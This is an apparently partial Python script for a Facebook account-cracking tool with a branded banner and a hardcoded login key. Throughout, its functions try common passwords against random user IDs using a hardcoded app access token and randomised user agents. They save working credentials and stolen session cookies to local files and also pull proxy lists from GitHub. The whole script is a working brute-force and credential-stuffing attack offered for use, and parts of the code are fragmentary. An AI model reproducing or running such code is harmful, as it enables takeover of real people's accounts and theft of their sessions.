...
#───────────────[ IMPORT SYSTEM ]─────────────────────────#
import requests,bs4,json,os,sys,random,datetime,time,requests
import os,random
...
princp=[]
try:
    prox= requests.get('https://github.com/nethunter999/dddddddddddd/blob/main/dddddddd.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/nethunter999/dddddddddddd/blob/main/dddddddd.txt').text
        ua=open('bbnew.txt','w')
...
def windows():
 def windows():
    aV=str(random.choice(range(10,27)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(30,105)))}.0.{str(random.choice(range(1002,4700)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(30,105)))}.0.{str(random.choice(range(1002,4700)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(30,105)))}.0.{str(random.choice(range(1002,4700)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
...
\033[34;1m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   : ADOR LOVE SATHI🥰🥰
\033[34;1m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  MY LOVE SATHI🥰🥰
\033[34;1m[\033[1;37m≈\033[1;31m]\033[1;37m GITHUB      :  😴😴
\033[34;1m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  0.2
\033[34;1m[\033[1;37m≈\033[1;31m]\033[1;37m TOOL        :  \033[1;34mFILE-/RANDOM\033[1;32m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FB GROUP    :  \033[1;91m\033[1;41m\033[1;33mMY LOVE SATHI 2024\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m"""
os.system('clear')
print(logo)
uname =input('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;92m TYPE ALEX ADOR= \033[1;91m: \033[1;35m')
def back():
	login()
#_________[ LOGIN KEY ]______>>
CorrectUsername = 'ADOR MY DAD'
key = 'true'
while key == 'true':
...
def menu():
    ...
    if GHOST in ['1']:
        ...
        os.system('xdg-open https:/free.facebook.com/DBZ280')
...
def rndm1(uid,passlist):
        ...
        sys.stdout.write(f'\r\r{B}[{G}FOYSAL-M1{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{R}[{G}FOYSAL-OK{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{Y}[{G}FOYSAL{Y}] {G2}●{X1} "+coki)
                                        open('/sdcard/FOYSAL-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
...
def rndm2(uid,passlist):
        ...
        global oks
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f'\r\r{B}[{G}FOYSAL-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{R}[{G}ADOR-OK{R}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{B}[{Y}FOYSAL-CP{B}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/FOYSAL-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
...
def rndm3(uid,passlist):
        ...
        global oks
        bo = random.choice([m,k,h,b,u,x])
        sys.stdout.write(f'\r\r{B}[{G}FOYSAL-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def login(uid):
    ...
    try:
        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mADOR\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mCP•{len(cps)}\x1b[38;5;196m]')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890","987654321","0987654321"]:
            ...
            if "session_key" in rp:
                print(f"\r{R}[{R}ADOR-OK😍{R}]{R} {uid} | {pw}")
                open("/sdcard/GHOST-ok.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          	
            	print(f"\r{R}[{G1}ADOR-OK🤩{R}]{G1} {uid} | {pw}")
...
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mFOYSAL•M1\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[1;96m[FOYSAL-2F] \x1b[38;5;205m {idf} | {pw}')
                ...
                print(f'\r\x1b[1;96m[FOYSAL-OK] \x1b[38;5;205m {idf} |\033[1;92m {pw}\n\x1b[1;91m[🍁] COOKIES • \033[0;93m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mFOYSAL•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
...
def cracktouch(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[1;31m[\033[1;37mFOYSAL•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{oki}\033[1;31m/{H}CP•{H}{cpi}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
